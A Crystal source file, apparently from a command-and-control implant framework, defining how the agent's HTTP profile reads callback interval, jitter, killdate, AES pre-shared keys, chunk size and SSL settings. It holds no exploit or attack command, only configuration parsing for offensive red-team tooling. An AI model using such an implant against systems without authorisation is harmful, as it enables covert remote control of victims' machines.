require "./base"

module Dark::Agent::Config
  # HTTP profile configuration handler
  class HTTP < Base
    def c2_profile : JSON::Any
      # HTTP profile has c2 settings in c2_profiles array
      # Will always use the first profile in the list
      if @config["c2_profiles"]? && @config["c2_profiles"].as_a.size > 0
        profile = @config["c2_profiles"][0]
        if profile["c2_profile_parameters"]?
          return profile["c2_profile_parameters"]
        end
      end

      # Fallback to c2 directly if available
      if @config["c2"]?
        return @config["c2"]
      end

      # Return an empty hash if nothing found
      JSON.parse("{}")
    end

    def payload_uuid : String
      if @config["agent"]? && @config["agent"]["uuid"]?
        return @config["agent"]["uuid"].as_s
      end
      ""
    end

    def sleep_interval : Int32
      c2 = c2_profile
      if c2["callback_interval"]?
        return c2["callback_interval"].as_i
      end
      5 # Default value
    end

    def jitter_percent : Int32
      c2 = c2_profile
      if c2["callback_jitter"]?
        return c2["callback_jitter"].as_i
      end
      10 # Default value
    end

    def killdate : String
      c2 = c2_profile
      if c2["killdate"]?
        return c2["killdate"].as_s
      end
      ""
    end

    def encryption_type : String
      c2 = c2_profile
      if c2["AESPSK"]? && c2["AESPSK"]["value"]?
        return c2["AESPSK"]["value"].as_s
      end
      ""
    end

    def encryption_key : String
      c2 = c2_profile
      if c2["AESPSK"]? && c2["AESPSK"]["enc_key"]?
        return c2["AESPSK"]["enc_key"].as_s
      end
      ""
    end

    def decryption_key : String
      c2 = c2_profile
      if c2["AESPSK"]? && c2["AESPSK"]["dec_key"]?
        return c2["AESPSK"]["dec_key"].as_s
      end
      ""
    end

    # Agent config options
    def symmetric_jitter? : Bool
      if @config["agent"]? && @config["agent"]["symmetric_jitter"]?
        return @config["agent"]["symmetric_jitter"].as_bool
      end
      false
    end

    def chunk_size : Int32
      if @config["agent"]? && @config["agent"]["chunk_size"]?
        return @config["agent"]["chunk_size"].as_i
      end
      512_000 # Default to 512KB
    end

    def realtime? : Bool
      if @config["agent"]? && @config["agent"]["realtime"]?
        return @config["agent"]["realtime"].as_bool
      end
      false
    end


    def ssl_verify? : Bool
      if @config["agent"]? && @config["agent"]["ssl_verify"]? && !@config["agent"]["ssl_verify"].raw.nil?
        return @config["agent"]["ssl_verify"].as_bool
      end
      true # Default to SSL verification enabled for security
    end

    def disable_ssl_verify? : Bool
      !ssl_verify?
    end
  end
end